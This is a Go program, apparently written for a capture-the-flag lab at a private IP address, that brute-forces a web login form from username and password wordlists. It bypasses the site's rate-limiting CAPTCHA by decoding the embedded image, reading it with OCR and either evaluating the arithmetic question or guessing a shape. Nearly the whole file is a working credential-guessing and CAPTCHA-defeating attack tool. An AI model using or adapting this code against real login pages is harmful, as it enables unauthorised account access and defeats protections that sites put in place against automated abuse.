package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/Knetic/govaluate"
	"github.com/PuerkitoBio/goquery"
	"github.com/otiai10/gosseract/v2"
)

const url = "http://10.10.33.210/login"

func main() {
	var username []string
	var password []string

	user, err := os.OpenFile("../usernames.txt", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer user.Close()
	scanner := bufio.NewScanner(user)
	for scanner.Scan() {
		username = append(username, scanner.Text())
	}

	pass, err := os.OpenFile("../passwords.txt", os.O_RDONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer pass.Close()
	scanner = bufio.NewScanner(pass)
	for scanner.Scan() {
		password = append(password, scanner.Text())
	}

	// instead replace this with a indexed loop that calls a functions with 3 names, pass and
	// send all 3 requests in 3 routines wait for the result, if sol is found, stop else solve captcha and continue
	for _, u := range username {
		for _, p := range password {
			resp := login(u, p) // try to login // send it three times
			// fmt.Println(resp.Header.Get("Content-Length"))

			var bytesBuf bytes.Buffer
			teeReader := io.TeeReader(resp.Body, &bytesBuf)
			bodyBytes, err := io.ReadAll(teeReader)
			if err != nil {
				log.Fatal(err)
			}
			if bytes.Contains(bodyBytes, []byte("Invalid username or password")) { // incorrect login but no - captcha yet
				continue
			} else if bytes.Contains(bodyBytes, []byte("Detected 3 incorrect login attempts!")) {
				resp.Body = io.NopCloser(&bytesBuf)
				fmt.Println("Captcha solver")
				captchaSolver(resp.Body)
			} else {
				txt, err := io.ReadAll(resp.Body)
				if err != nil {
					log.Fatal(err)
				}
				fmt.Printf("username: %s, password: %s\n%s", u, p, string(txt))
			}
			resp.Body.Close()
		}
	}

	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	solveCaptcha(resp.Body)
	fmt.Println(resp.Header.Get("Content-Length"))
}

func login(user, pass string) *http.Response {
	fmt.Printf("username: %s, password: %s\n", user, pass)
	bd := bytes.NewBufferString(fmt.Sprintf("username=%s&password=%s", user, pass))
	req, err := http.NewRequest(http.MethodPost, url, bd)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	return resp
}

func captchaSolver(buf io.Reader) {
	sol := solveCaptcha(buf)

	ctr := 0
	for ctr <= 10 {
		// fmt.Print("#")
		bd := bytes.NewBufferString(fmt.Sprintf("captcha=%s", sol))
		req, err := http.NewRequest(http.MethodPost, url, bd)
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		if resp.Header.Get("Content-Length") == "1944" {
			return
		}
		sol = solveCaptcha(resp.Body)
		fmt.Println(sol)
		ctr++
	}
}

func solveCaptcha(body io.Reader) string {
	doc, err := goquery.NewDocumentFromReader(body)
	if err != nil {
		log.Fatal(err)
	}

	var img []string
	doc.Find("img").Each(func(i int, s *goquery.Selection) {
		src, exists := s.Attr("src")
		if !exists {
			return
		}
		if !strings.Contains(src, ",") {
			return
		}

		img_raw, err := base64.StdEncoding.DecodeString(strings.Split(src, ",")[1])
		if err != nil {
			log.Fatal(err)
		}

		img = append(img, string(img_raw))
	})

	tmp, err := os.CreateTemp("", "image.jpg")
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(tmp.Name())

	if _, err := tmp.Write([]byte(img[0])); err != nil {
		log.Fatal(err)
	}
	tmp.Close()

	client := gosseract.NewClient()
	defer client.Close()

	client.SetImage(tmp.Name())
	text, err := client.Text()
	if err != nil {
		log.Fatal("OCR error:", err)
	}

	if !strings.Contains(text, "=") {
		return detectShape(text)
	}
	return evalExpr(text)
}

func evalExpr(text string) string {
	if !strings.Contains(text, "=") {
		return ""
	}
	expr := strings.Split(text, "=")[0]
	exp, err := govaluate.NewEvaluableExpression(expr)
	if err != nil {
		fmt.Println("Error parsing expression:", err)
		return ""
	}

	result, err := exp.Evaluate(nil)
	if err != nil {
		fmt.Println("Error evaluating expression:", err)
		return ""
	}

	return fmt.Sprintf("%v", result)
}

func detectShape(file string) string {
	fmt.Println(file)
	if file == "C)" {
		return "circle"
	} else if file == "||" {
		return "square"
	} else if file == "/\\" {
		return "triangle"
	}
	return "unknown"
}
